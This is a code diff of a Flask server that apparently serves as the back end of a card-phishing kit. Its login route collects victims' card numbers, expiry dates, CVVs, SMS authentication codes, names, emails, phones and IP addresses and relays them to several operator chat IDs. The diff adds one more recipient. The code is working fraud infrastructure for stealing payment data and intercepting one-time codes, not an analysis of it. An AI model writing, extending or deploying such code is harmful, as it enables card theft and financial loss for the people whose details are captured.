@@ -1,7 +1,7 @@
 from flask import Flask, redirect, request, jsonify
 from flask_cors import CORS
 from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut
-from CHAT_ID import MAIN_ID, Egoist, Egoist2, Plaxa, Egoist3
+from CHAT_ID import MAIN_ID, Egoist, Egoist2, Plaxa, Egoist3, Egoist4
 from checker import get_button_by_id
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
@@ -64,7 +64,6 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
-        
         # Egoist2
         elif id == '1000003':
             if authCode is not None and authCode != 'None':
@@ -73,7 +72,6 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(Egoist2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
-        
         # Plaxa
         elif id == '1000004':
             if authCode is not None and authCode != 'None':
@@ -81,8 +79,7 @@ def login():
                 return '', 200  # Возвращаем пустой ответ с кодом 200
             ne_pizdabol(card_number)
             send_buttons_message(Plaxa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
-            return '', 200  # Возвращаем пустой ответ с кодом 200
-        
+            return '', 200  # Возвращаем пустой ответ с кодом 200        
         elif id == '1000005':
             if authCode is not None and authCode != 'None':
                 send_sms(Egoist3, card_number, expiry_date, cvv, authCode, ID)
@@ -90,7 +87,14 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(Egoist3, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
-        
+        elif id == '1000006':
+            if authCode is not None and authCode != 'None':
+                send_sms(Egoist4, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(Egoist4, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200        
+
         return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
 
     elif request.method == 'POST':
